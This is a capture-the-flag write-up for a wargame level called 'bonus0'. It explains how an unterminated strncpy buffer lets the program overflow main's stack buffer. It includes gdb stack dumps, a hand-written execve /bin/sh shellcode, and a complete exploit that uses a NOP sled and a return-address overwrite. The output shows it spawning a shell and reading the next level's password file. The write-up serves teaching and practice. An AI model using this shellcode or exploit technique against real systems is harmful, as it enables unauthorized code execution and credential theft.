## Don't forget, sentences end with a point and strings with a '\0' (bonus0)

With this [binary](source.c) we're back to good old C and classic buffer
overflows. There's three functions including _main_. The _main_ has a local
buffer of 54 bytes, and calls the function _pp_ on it. There we have two other
buffers each 20 bytes long. _pp_ will call the third function _p_ on both to
fill them with some user input. After that the two buffers are copied and
insecurely concatenated in the buffer provided by the _main_ function.

After some gdb analysis, we can see the state of the stack from _p_:

```shell
# print part of the stack from the end p's buffer
(gdb) x/56wx 0xbffffa88

0xbffffa88:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffffa98:     0x61616161      0x00616161      0x00000001      0x00000000
0xbffffaa8:     0xbffffb08     [0x0804854c]     0xbffffaec      0x080486a0
0xbffffab8:     0x00000000      0x00000001      0x00000000      0x00000000
0xbffffac8:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffad8:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffffae8:     0x61616161      0x62626262      0x62626262      0x62626262
0xbffffaf8:     0x62626262      0x00626262      0xb7fd0ff4      0x00000000
0xbffffb08:     0xbffffb58     [0x080485b9]     0xbffffb26      0x080498d8
0xbffffb18:     0x00000001      0x0804835d      0xb7fd13e4      0x00080000
0xbffffb28:     0x080498d8      0x080485f1      0xffffffff      0xb7e5edc6
0xbffffb38:     0xb7fd0ff4      0xb7e5ee55      0xb7fed280      0x00000000
0xbffffb48:     0x080485d9      0xb7fd0ff4      0x080485d0      0x00000000
0xbffffb58:     0x00000000     [n0xb7e454d3]    0x00000001      0xbffffbf4
```

> The values between brackets are the return addresses of every function in the
> binary.

* 0xbffffa88 -> 0xbffffaa0 (24 bytes): end of _p_'s big read buffer (all "0x61")
* 0xbffffaa8 (4 bytes): 0xbffffb08 _pp_'s ebp
* 0xbffffaac (4 bytes): 0x0804854c _p_'s return address <_pp_+46>
* 0xbffffad8 -> 0xbffffaec (20 bytes): _pp_'s first buffer (all "0x61")
* 0xbffffaec -> 0xbffffb00 (20 bytes): _pp_'s second buffer (all "0x62")
* 0xbffffb08 (4 bytes): 0xbffffb58 _main_'s ebp
* 0xbffffb0c (4 bytes): 0x080485b9 _pp_'s return address <_main_+21>
* 0xbffffb26 -> 0xbffffb58 (50 bytes): _main_'s buffer (random data)
* 0xbffffb58 (4 bytes): 0x00000000 *\_\_libc\_start\_main*'s ebp ? (look that up)
* 0xbffffb5c (4 bytes): 0xb7e454d3 _main_'s return address <*\_\_libc\_start\_main*+243>

> To get this result we passed as a first input the result of this command:
> `python -c 'print "a" * 4095'`, and this one for the second input:
> `python -c 'print "b" * 19'` so that they would not overflow their buffers.

_p_'s address cannot be overwritten since the call to `read` is safe and that
`strncpy` targets _pp_'s buffers. But this where the "unsafety" starts. This
`strncpy` call is dangerous because even though it has an upper bound equal to
the length of the buffers it writes to (20), they will not be null-terminated
by the function if the input data is at least 20 bytes long. Also, since the
buffers are next to each other in memory this means that they will be treated as
one big string even if there are null bytes after the second buffer.

This problem is not just theoretical because these buffers ares used with an
`strcpy` and an `strcat` call. Basically the first buffer is going to be copied
into _main_'s buffer. Then the null byte is going to be replaced with a space,
because yolo, and the second buffer is going to be concatenated to it.

In the best case scenario, if the two input buffers are filled with precisely 19
bytes of data and one null-byte _main_'s buffer should contain 39 bytes of data
and one null-byte:

```shell
# run the binary
./bonus0
 - 
# first input (19 bytes)
aaaaaaaaaaaaaaaaaaa
 - 
# second input (19 bytes too)
bbbbbbbbbbbbbbbbbbb
# nice output
aaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbb
```

Now just add one byte to the first input:

```shell
# run the binary
./bonus0
 - 
# first input (20 bytes)
aaaaaaaaaaaaaaaaaaaa
 - 
# second input (19 bytes)
bbbbbbbbbbbbbbbbbbb
# nice-ish output
aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbb bbbbbbbbbbbbbbbbbbb
Segmentation fault (core dumped)
```

What just happened ? The 20 bytes in the first input made it so `strncpy` could
not add a terminating null byte. After the second input is given an `strcpy`
call supposedly copies the 20 bytes of data from the first buffer to _main_'s
buffer. But since it _directly_ followed by the second buffer in memory the call
really copies 39 bytes of data to the destination buffer. And it does not stop
there. Then it replaces the null byte by a space and appends the 19 bytes again
and adds an other null byte. In total this fills the 50 byte buffer with 60
bytes of data (including the null byte).

Basically this means that we can overwrite _main_'s return address. It fills it
with garbage values above, hence the sefault, but we can do something useful
with this. So we have to write 54 bytes of data before overwriting _main_'s
return address.

We could have done a ret2libc (see [level2](../level2)), but this is not
possible because we only overflow the buffer by 10 bytes and ret2libc requires
at least writing 12 bytes to be useful (to be able to pass arguments to the
called function). So what we need is a [shellcode](../shellcode) and as small as
possible. Like this [one](shellstorm_shellcode.asm) found on
[shellstorm](http://shell-storm.org/shellcode/). Although it did not work in our
case. This is because the registers and stack were already set to random values,
not to 0 as if the program just started on the shellcode. So after some
tinkering here is the final shellcode:

```nasm
section .text
global _start
_start:
xor     edx, edx    ; set edx to 0
push    edx         ; push it to the stack to end the command string
push    0x68732f2f  ; "//sh" end of the command string
push    0x6e69622f  ; "/bin" start of the command string
mov     ebx, esp    ; set ebx to the start of the command string
push    edx         ; push a NULL
push    ebx         ; push the command string's address
mov     ecx, esp    ; set ecx as a pointer to the command string's address (argv)
push    0xb         ; push 11 (execve interrupt number)
pop     eax         ; set eax to 11
int     0x80        ; call execve
```

This will execute execve with "/bin//sh" as parameter and open us a shell. Now
the exploit:

```shell
python -c 'print "\x90" * 1000 + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x6a\x0b\x58\xcd\x80"'
python -c 'print "a" * 14 + "\xbf\xff\xee\x60"[::-1] * 1 + "a" * 1'
cat
```

The shellcode is at the end of the first input. It will be stored inside _p_'s
read buffer. We put a lot of noops operation before it because we do not know
the precise location of the buffer, so we will set _main_'s return address to
the address we got from gdb plus 128 bytes or so. This works because the layout
differences are not really big between the gdb run process and the normal
version. The read buffer is large enough for that so let's use it. So when the
binary receives this input _main_'s return address is replace with 0xbfffee60,
which is *somewhere* inside _p_'s buffer, the eip skips every noop instructions
to finally encounter and execute the shellcode.

```shell
# run the exploit script above
./exploit.bash | ./bonus0
 - 
 - 
aaaaaaaaaaaaaa`a aaaaaaaaaaaaaa`a
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
